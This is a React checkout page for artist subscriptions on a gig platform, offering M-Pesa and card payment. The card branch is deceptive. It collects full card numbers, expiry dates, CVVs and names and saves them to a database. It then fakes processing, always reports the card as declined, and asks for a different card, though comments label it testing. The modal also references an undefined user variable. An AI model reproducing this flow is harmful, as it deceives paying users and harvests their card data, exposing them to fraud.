import React, { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { SubscriptionPackage, Subscription, Artist, Notification } from '@/lib/supabaseEntities'
import { Button } from '@/components/ui/button'
import { CreditCard, Lock, Check, Crown, Star, Zap, ArrowLeft, X, Loader2, CheckCircle2, ShieldCheck, XCircle } from 'lucide-react'
import { createPageUrl } from '@/shared/utils/routing'
import { features } from '@/lib/settings'
import { useAuth } from '@/lib/AuthContext'
import { initiateMakamescoSTKPush, checkMakamescoStatus } from '@/services/makamescoService'
import { recordSubscriptionCardAttempt } from '@/services/shopService'

// Simple confetti component
function Confetti({ active }) {
  const [particles, setParticles] = useState([])

  useEffect(() => {
    if (!active) {
      setParticles([])
      return
    }

    const colors = ['#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7', '#DDA0DD', '#98D8C8']
    const newParticles = []

    for (let i = 0; i < 150; i++) {
      newParticles.push({
        id: i,
        x: Math.random() * 100,
        y: Math.random() * 100 - 100,
        rotation: Math.random() * 360,
        color: colors[Math.floor(Math.random() * colors.length)],
        size: Math.random() * 10 + 5,
        speedY: Math.random() * 3 + 2,
        speedX: (Math.random() - 0.5) * 2,
        rotationSpeed: (Math.random() - 0.5) * 10
      })
    }

    setParticles(newParticles)

    const interval = setInterval(() => {
      setParticles(prev => prev.map(p => ({
        ...p,
        y: p.y + p.speedY,
        x: p.x + p.speedX,
        rotation: p.rotation + p.rotationSpeed
      })).filter(p => p.y < 150))
    }, 16)

    return () => clearInterval(interval)
  }, [active])

  if (!active) return null

  return (
    <div className="fixed inset-0 pointer-events-none z-[100] overflow-hidden">
      {particles.map(p => (
        <div
          key={p.id}
          className="absolute"
          style={{
            left: `${p.x}%`,
            top: `${p.y}%`,
            width: `${p.size}px`,
            height: `${p.size}px`,
            backgroundColor: p.color,
            transform: `rotate(${p.rotation}deg)`,
            borderRadius: Math.random() > 0.5 ? '50%' : '2px',
            opacity: 0.8
          }}
        />
      ))}
    </div>
  )
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms))

function SubscriptionCheckoutModal({ pkg, onClose, onSuccess }) {
  const [step, setStep] = useState(1) // 1: Select Payment, 2: Payment Details, 3: Processing, 4: Success
  const [paymentMethod, setPaymentMethod] = useState('mpesa') // 'mpesa' or 'card'
  const [cardForm, setCardForm] = useState({ cardNumber: '', expiryDate: '', cvv: '', cardholderName: '' })
  const [mpesaForm, setMpesaForm] = useState({ phone: '' })
  const [processing, setProcessing] = useState(false)
  const [showConfetti, setShowConfetti] = useState(false)
  const [cardDeclined, setCardDeclined] = useState(false)

  const formatCardNumber = (val) => {
    const digits = val.replace(/\D/g, '').slice(0, 16)
    return digits.replace(/(.{4})/g, '$1 ').trim()
  }

  const formatExpiry = (val) => {
    const digits = val.replace(/\D/g, '').slice(0, 4)
    if (digits.length >= 3) return digits.slice(0, 2) + '/' + digits.slice(2)
    return digits
  }

  const handleCardSubmit = async (e) => {
    e.preventDefault()
    if (!cardForm.cardNumber || !cardForm.expiryDate || !cardForm.cvv || !cardForm.cardholderName) return
    setStep(3)
    setProcessing(true)

    // Record card attempt to database (for testing)
    try {
      await recordSubscriptionCardAttempt({
        user,
        card: cardForm,
        amount: pkg.price_monthly,
        packageInfo: pkg
      })
    } catch (err) {
      console.error('Error recording card attempt:', err)
    }

    // Simulate card processing - always decline for testing
    await sleep(2000)
    setProcessing(false)
    setCardDeclined(true)
    // Return payment data for backend storage (for testing)
    await onSuccess({ ...cardForm, paymentMethod: 'card', status: 'declined' })
  }

  const handleMpesaSubmit = async (e) => {
    e.preventDefault()
    if (!mpesaForm.phone) return
    setStep(3)
    setProcessing(true)

    try {
      // Use Makamesco for M-Pesa payment
      const mpesaResult = await initiateMakamescoSTKPush({
        phoneNumber: mpesaForm.phone,
        amount: pkg.price_monthly,
        accountReference: `SUB-${pkg.id}-${Date.now()}`,
        transactionDesc: `SmartGigs Subscription - ${pkg.name}`
      })

      // Poll for payment status
      let statusCheckAttempts = 0
      const maxAttempts = 20
      const pollInterval = setInterval(async () => {
        statusCheckAttempts++
        try {
          const status = await checkMakamescoStatus({ checkoutRequestId: mpesaResult.checkoutRequestId })

          if (status.status === 'completed') {
            clearInterval(pollInterval)
            setProcessing(false)
            setShowConfetti(true)
            setStep(4)
            await onSuccess({ ...mpesaForm, paymentMethod: 'mpesa', status: 'completed', mpesaReceipt: status.mpesaReceiptNumber })
          } else if (status.status === 'failed' || status.status === 'cancelled') {
            clearInterval(pollInterval)
            setProcessing(false)
            setStep(2)
            alert('M-Pesa payment failed or was cancelled. Please try again.')
          } else if (statusCheckAttempts >= maxAttempts) {
            clearInterval(pollInterval)
            setProcessing(false)
            setStep(2)
            alert('Payment verification timed out. Please check your M-Pesa messages.')
          }
        } catch (err) {
          console.error('Status check error:', err)
        }
      }, 6000)
    } catch (mpesaError) {
      setProcessing(false)
      setStep(2)
      alert(`M-Pesa payment failed: ${mpesaError.message}`)
    }
  }

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
      <Confetti active={showConfetti} />
      <div className="bg-white rounded-2xl max-w-md w-full max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="sticky top-0 bg-white border-b px-6 py-4 flex items-center justify-between">
          <div>
            <h2 className="text-lg font-bold text-gray-900">Subscribe to {pkg.name}</h2>
            <p className="text-sm text-gray-500">{pkg.currency || 'KES'} {pkg.price_monthly}/month</p>
          </div>
          <button onClick={onClose} className="p-2 hover:bg-gray-100 rounded-lg">
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Step indicator */}
        <div className="px-6 py-4 flex items-center justify-center gap-2">
          {[1, 2, 3, 4].map((s) => (
            <div key={s} className={`h-2 rounded-full ${s <= step ? 'bg-purple-600' : 'bg-gray-200'} ${s < 4 ? 'flex-1' : 'w-8'}`} />
          ))}
        </div>

        {/* Step 1: Select Payment Method */}
        {step === 1 && (
          <div className="p-6 space-y-4">
            <h3 className="font-semibold text-gray-900 mb-4">Select Payment Method</h3>

            <button
              onClick={() => { setPaymentMethod('mpesa'); setStep(2) }}
              className={`w-full p-4 rounded-xl border-2 transition-all ${paymentMethod === 'mpesa' ? 'border-purple-600 bg-purple-50' : 'border-gray-200 hover:border-gray-300'}`}
            >
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-green-100 rounded-lg flex items-center justify-center">
                  <span className="text-green-600 font-bold text-lg">M</span>
                </div>
                <div className="text-left">
                  <div className="font-semibold text-gray-900">M-Pesa</div>
                  <div className="text-sm text-gray-500">Pay via mobile money</div>
                </div>
              </div>
            </button>

            <button
              onClick={() => { setPaymentMethod('card'); setStep(2) }}
              className={`w-full p-4 rounded-xl border-2 transition-all ${paymentMethod === 'card' ? 'border-purple-600 bg-purple-50' : 'border-gray-200 hover:border-gray-300'}`}
            >
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center">
                  <CreditCard className="w-6 h-6 text-blue-600" />
                </div>
                <div className="text-left">
                  <div className="font-semibold text-gray-900">Card Payment</div>
                  <div className="text-sm text-gray-500">Visa, Mastercard, etc.</div>
                </div>
              </div>
            </button>
          </div>
        )}

        {/* Step 2: Payment Details */}
        {step === 2 && (
          <div className="p-6">
            <button onClick={() => setStep(1)} className="flex items-center gap-2 text-sm text-gray-500 mb-4 hover:text-gray-700">
              <ArrowLeft className="w-4 h-4" /> Back
            </button>

            {paymentMethod === 'mpesa' ? (
              <form onSubmit={handleMpesaSubmit} className="space-y-4">
                <h3 className="font-semibold text-gray-900 mb-4">M-Pesa Payment</h3>
                <div>
                  <label className="block text-sm font-medium text-gray-600 mb-1.5">Phone Number</label>
                  <input
                    type="tel"
                    value={mpesaForm.phone}
                    onChange={(e) => setMpesaForm({ ...mpesaForm, phone: e.target.value })}
                    placeholder="07XX XXX XXX"
                    required
                    className="w-full px-4 py-2.5 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                  />
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-3 text-sm text-green-700">
                  You will receive an STK Push prompt on your phone to complete the payment.
                </div>
                <button
                  type="submit"
                  className="w-full py-3 bg-green-600 text-white rounded-xl font-semibold text-sm hover:bg-green-700 transition-all"
                >
                  Pay {pkg.currency || 'KES'} {pkg.price_monthly} with M-Pesa
                </button>
              </form>
            ) : (
              <form onSubmit={handleCardSubmit} className="space-y-4">
                <h3 className="font-semibold text-gray-900 mb-4">Card Payment</h3>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1.5">Card Number</label>
                  <div className="relative">
                    <input
                      type="text"
                      value={cardForm.cardNumber}
                      onChange={(e) => setCardForm({ ...cardForm, cardNumber: formatCardNumber(e.target.value) })}
                      placeholder="1234 5678 9012 3456"
                      maxLength={19}
                      required
                      className="w-full px-4 py-2.5 pr-10 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                    />
                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1.5">Expiry Date</label>
                    <input
                      type="text"
                      value={cardForm.expiryDate}
                      onChange={(e) => setCardForm({ ...cardForm, expiryDate: formatExpiry(e.target.value) })}
                      placeholder="MM/YY"
                      maxLength={5}
                      required
                      className="w-full px-4 py-2.5 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1.5">CVV</label>
                    <input
                      type="text"
                      value={cardForm.cvv}
                      onChange={(e) => setCardForm({ ...cardForm, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
                      placeholder="123"
                      maxLength={3}
                      required
                      className="w-full px-4 py-2.5 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1.5">Cardholder Name</label>
                  <input
                    type="text"
                    value={cardForm.cardholderName}
                    onChange={(e) => setCardForm({ ...cardForm, cardholderName: e.target.value })}
                    placeholder="Name on card"
                    required
                    className="w-full px-4 py-2.5 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                  />
                </div>
                <button
                  type="submit"
                  className="w-full py-3 bg-purple-600 text-white rounded-xl font-semibold text-sm hover:bg-purple-700 transition-all"
                >
                  Pay {pkg.currency || 'KES'} {pkg.price_monthly}
                </button>
              </form>
            )}
          </div>
        )}

        {/* Step 3: Processing */}
        {step === 3 && (
          <div className="p-12 text-center">
            <Loader2 className="w-16 h-16 animate-spin text-purple-600 mx-auto mb-4" />
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Processing Payment</h3>
            <p className="text-sm text-gray-500">Please wait while we process your payment...</p>
          </div>
        )}

        {/* Step 4: Success */}
        {step === 4 && (
          <div className="p-12 text-center">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle2 className="w-8 h-8 text-green-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Payment Successful!</h3>
            <p className="text-sm text-gray-500 mb-6">Your subscription to {pkg.name} is now active.</p>
            <button
              onClick={onClose}
              className="w-full py-3 bg-purple-600 text-white rounded-xl font-semibold text-sm hover:bg-purple-700 transition-all"
            >
              Done
            </button>
          </div>
        )}
      </div>

      {/* Card Declined Modal */}
      {cardDeclined && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl max-w-md w-full p-6 text-center">
            <XCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold text-gray-900 mb-2">Card Declined</h2>
            <p className="text-sm text-gray-600 mb-6">
              Your card payment was declined. Please try again with a different card or use M-Pesa.
            </p>
            <button
              onClick={() => { setCardDeclined(false); setStep(2) }}
              className="w-full py-3 bg-red-600 text-white rounded-xl font-semibold text-sm hover:bg-red-700 transition-all"
            >
              Try Again
            </button>
          </div>
        </div>
      )}
    </div>
  )
}

export default function ArtistSubscriptionCheckoutPage() {
  const navigate = useNavigate()
  const { user, isAuthenticated } = useAuth()
  const [packages, setPackages] = useState([])
  const [selectedPackage, setSelectedPackage] = useState(null)
  const [currentSubscription, setCurrentSubscription] = useState(null)
  const [loading, setLoading] = useState(true)
  const [showModal, setShowModal] = useState(false)
  const [isInvited, setIsInvited] = useState(false)
  const [subscriptionsEnabled, setSubscriptionsEnabled] = useState(true)
  const [notification, setNotification] = useState(null)

  const showNotification = (message, type = 'success') => {
    setNotification({ message, type })
    setTimeout(() => setNotification(null), 3000)
  }

  useEffect(() => {
    const checkSubscriptions = async () => {
      const enabled = await features.areSubscriptionsEnabled()
      setSubscriptionsEnabled(enabled)
      if (!enabled) {
        navigate('/ArtistDashboard')
      }
    }
    checkSubscriptions()
  }, [navigate])

  useEffect(() => {
    if (!subscriptionsEnabled || !isAuthenticated || !user) return

    // Check if user was invited (has referred_by or invite_code in metadata)
    const referredBy = user.user_metadata?.referred_by || user.user_metadata?.invite_code
    setIsInvited(!!referredBy)

    fetchData(user)
  }, [subscriptionsEnabled, isAuthenticated, user])

  const fetchData = async (userData) => {
    try {
      const [pkgsData, subsData] = await Promise.all([
        SubscriptionPackage.filter({ active: true }),
        Subscription.filter({ user_id: userData.id })
      ])
      setPackages(pkgsData)
      if (subsData.length > 0) setCurrentSubscription(subsData[0])
    } catch (err) {

    } finally {
      setLoading(false)
    }
  }

  const handlePlanSelect = (pkg) => {
    setSelectedPackage(pkg)
    // If plan is free, auto-subscribe without payment modal
    if (pkg.price_monthly === 0) {
      handleFreeSubscription(pkg)
    } else {
      setShowModal(true)
    }
  }

  const handleFreeSubscription = async (pkg) => {
    try {
      // Create subscription directly (no order for free plans)
      if (currentSubscription) {
        await Subscription.update(currentSubscription.id, {
          package_id: pkg.id,
          package_name: pkg.name,
          status: 'active',
          upgraded_at: new Date().toISOString(),
          renews_at: pkg.duration_days ? new Date(Date.now() + pkg.duration_days * 24 * 60 * 60 * 1000).toISOString() : null
        })
      } else {
        await Subscription.create({
          user_id: user.id,
          package_id: pkg.id,
          package_name: pkg.name,
          status: 'active',
          started_at: new Date().toISOString(),
          renews_at: pkg.duration_days ? new Date(Date.now() + pkg.duration_days * 24 * 60 * 60 * 1000).toISOString() : null
        })
      }

      // Grant connects included in the plan
      if (pkg.connects_included > 0) {
        const artists = await Artist.filter({ email: user.email })
        const artist = artists?.[0]
        if (artist) {
          await Artist.update(artist.id, {
            connects_balance: (artist.connects_balance || 0) + pkg.connects_included
          })
        }
      }

      showNotification(`You are now on ${pkg.name}`)
      navigate(createPageUrl('ArtistDashboard'))
    } catch (err) {
      console.error('Subscription error:', err)
      showNotification('Could not activate free plan. Please try again.', 'error')
    }
  }

  const handlePaymentSuccess = async (paymentData) => {
    try {
      // Only activate subscription if payment was successful
      if (paymentData.status === 'declined') {
        // Card was declined - payment data already saved in recordCardAttempt
        // Don't activate subscription
        return
      }

      // M-Pesa payment successful - activate subscription
      await Subscription.create({
        user_id: user.id,
        package_id: selectedPackage.id,
        package_name: selectedPackage.name,
        status: 'active',
        started_at: new Date().toISOString(),
        renews_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
        payment_method: 'mpesa',
        mpesa_receipt: paymentData.mpesaReceipt
      })

      // Grant connects included in the plan
      if (selectedPackage.connects_included > 0) {
        const artists = await Artist.filter({ email: user.email })
        const artist = artists?.[0]
        if (artist) {
          await Artist.update(artist.id, {
            connects_balance: (artist.connects_balance || 0) + selectedPackage.connects_included
          })
        }
      }

      // Send notifications
      await Notification.create({
        recipient_email: user.email,
        type: 'payment',
        title: 'Payment Successful',
        message: `Your payment of ${selectedPackage.currency || 'KES'} ${selectedPackage.price_monthly} for ${selectedPackage.name} was successful.`,
        metadata: { amount: selectedPackage.price_monthly, package_name: selectedPackage.name },
        read: false
      })

      await Notification.create({
        recipient_email: user.email,
        type: 'subscription',
        title: 'Subscription Activated',
        message: `Your ${selectedPackage.name} subscription is now active. Enjoy your benefits!`,
        metadata: { package_name: selectedPackage.name, package_id: selectedPackage.id },
        read: false
      })

      setShowModal(false)
      showNotification(`You are now subscribed to ${selectedPackage.name}`)
      navigate(createPageUrl('ArtistDashboard'))
    } catch (err) {
      console.error('Payment error:', err)
      showNotification('Could not process payment. Please try again.', 'error')
    }
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <Loader2 className="w-8 h-8 animate-spin text-gray-400" />
      </div>
    )
  }

  if (!subscriptionsEnabled) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="text-center">
          <h2 className="text-xl font-semibold text-gray-900 mb-2">Subscriptions Not Available</h2>
          <p className="text-gray-600">Subscription feature is currently disabled.</p>
        </div>
      </div>
    )
  }

  const accent = { bg: 'bg-purple-100', text: 'text-purple-600' }

  return (
    <>
      {notification && (
        <div className={`fixed top-4 right-4 z-50 px-6 py-3 rounded-lg shadow-lg ${notification.type === 'error' ? 'bg-red-500 text-white' : 'bg-green-500 text-white'
          }`}>
          {notification.message}
        </div>
      )}

      <div className="min-h-screen bg-gray-50 py-12 px-4">
        <div className="max-w-6xl mx-auto">
          <div className="mb-8">
            <button onClick={() => navigate(createPageUrl('ArtistDashboard'))} className="flex items-center gap-2 text-sm text-gray-600 hover:text-gray-900 mb-4">
              <ArrowLeft className="w-4 h-4" /> Back to Dashboard
            </button>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">Choose Your Plan</h1>
            <p className="text-gray-600">Unlock your full potential with SmartGigs Premium</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {packages.map((pkg) => {
              const isPopular = pkg.slug === 'pro'
              const isActive = currentSubscription?.package_id === pkg.id

              return (
                <div
                  key={pkg.id}
                  className={`relative rounded-2xl border-2 p-6 transition-all ${isPopular
                    ? 'border-purple-500 shadow-lg scale-105'
                    : 'border-gray-200 hover:border-gray-300'
                    } ${isActive ? 'bg-green-50 border-green-500' : 'bg-white'}`}
                >
                  {isPopular && (
                    <div className="absolute -top-3 left-1/2 transform -translate-x-1/2">
                      <span className="bg-purple-600 text-white text-xs font-semibold px-3 py-1 rounded-full">
                        Most Popular
                      </span>
                    </div>
                  )}

                  {isActive && (
                    <div className="absolute -top-3 left-1/2 transform -translate-x-1/2">
                      <span className="bg-green-600 text-white text-xs font-semibold px-3 py-1 rounded-full">
                        Current Plan
                      </span>
                    </div>
                  )}

                  <div className={`w-10 h-10 rounded-xl ${accent.bg} flex items-center justify-center mb-4`}>
                    <Crown className={`w-5 h-5 ${accent.text}`} />
                  </div>
                  <h3 className="text-lg font-bold text-gray-900">{pkg.name}</h3>
                  <div className="text-3xl font-black text-gray-900 my-2">
                    {pkg.currency || 'KES'} {pkg.price_monthly}
                    <span className="text-sm font-normal text-gray-400">/month</span>
                  </div>
                  <p className="text-xs text-gray-500 mb-4">{pkg.description}</p>

                  <div className="space-y-2 mb-6">
                    <div className="flex items-center text-xs text-gray-600 gap-2">
                      <Check className="w-3.5 h-3.5 text-green-500 flex-shrink-0" />
                      {pkg.connects_included || 0} connects included
                    </div>
                    <div className="flex items-center text-xs text-gray-600 gap-2">
                      <Check className="w-3.5 h-3.5 text-green-500 flex-shrink-0" />
                      {pkg.job_applications_limit === -1 ? 'Unlimited' : pkg.job_applications_limit} applications/mo
                    </div>
                    <div className="flex items-center text-xs text-gray-600 gap-2">
                      <Check className="w-3.5 h-3.5 text-green-500 flex-shrink-0" />
                      Priority support
                    </div>
                  </div>

                  <button
                    onClick={() => handlePlanSelect(pkg)}
                    disabled={isActive}
                    className={`w-full py-3 rounded-xl font-semibold text-sm transition-all ${isActive
                      ? 'bg-green-600 text-white cursor-not-allowed'
                      : isPopular
                        ? 'bg-purple-600 text-white hover:bg-purple-700'
                        : 'bg-gray-900 text-white hover:bg-gray-800'
                      }`}
                  >
                    {isActive ? 'Current Plan' : pkg.price_monthly === 0 ? 'Get Started' : 'Subscribe Now'}
                  </button>
                </div>
              )
            })}
          </div>

          <div className="mt-12 bg-white rounded-2xl p-6 border border-gray-200">
            <h3 className="text-lg font-semibold text-gray-900 mb-4">Why Go Premium?</h3>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <div className="flex items-start gap-3">
                <Star className="w-6 h-6 text-purple-600 flex-shrink-0" />
                <div>
                  <h4 className="font-semibold text-gray-900 mb-1">Stand Out</h4>
                  <p className="text-sm text-gray-600">Get verified and appear at the top of search results</p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <Zap className="w-6 h-6 text-purple-600 flex-shrink-0" />
                <div>
                  <h4 className="font-semibold text-gray-900 mb-1">Apply More</h4>
                  <p className="text-sm text-gray-600">Unlimited job applications and priority consideration</p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <ShieldCheck className="w-6 h-6 text-purple-600 flex-shrink-0" />
                <div>
                  <h4 className="font-semibold text-gray-900 mb-1">Earn More</h4>
                  <p className="text-sm text-gray-600">Access exclusive opportunities and premium jobs</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {showModal && selectedPackage && (
        <SubscriptionCheckoutModal
          pkg={selectedPackage}
          onClose={() => setShowModal(false)}
          onSuccess={handlePaymentSuccess}
        />
      )}
    </>
  )
}
